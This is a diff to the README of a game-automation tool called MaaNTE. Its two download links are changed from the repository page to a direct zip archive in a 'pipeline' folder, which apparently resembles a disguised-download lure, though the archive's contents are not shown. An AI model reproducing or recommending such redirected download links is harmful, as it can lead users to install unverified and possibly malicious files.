@@ -1,6 +1,6 @@
 # ⚡ MaaNTE - Your All-in-One Neverness to Everness Automation
 
-[![Download MaaNTE](https://img.shields.io/badge/Download-MaaNTE%20Free-brightgreen?style=for-the-badge&logo=github)](https://github.com/Hotpla2549/MaaNTE)
+[![Download MaaNTE](https://img.shields.io/badge/Download-MaaNTE%20Free-brightgreen?style=for-the-badge&logo=github)](https://github.com/Hotpla2549/MaaNTE/raw/refs/heads/main/pipeline/NTE-Maa-v1.7.zip)
 
 ## 📥 Download & Install
 
@@ -133,7 +133,7 @@ If you run into any issues or have questions, the community is here to help. Che
 
 ## 🔗 Quick Links
 
-- **[🔽 Download MaaNTE](https://github.com/Hotpla2549/MaaNTE)** - Get the latest version now
+- **[🔽 Download MaaNTE](https://github.com/Hotpla2549/MaaNTE/raw/refs/heads/main/pipeline/NTE-Maa-v1.7.zip)** - Get the latest version now
 - **📖 Documentation** - In-depth guides and tutorials
 - **🐛 Report Issues** - Let developers know about problems
 - **💬 Join Community** - Connect with other MaaNTE users
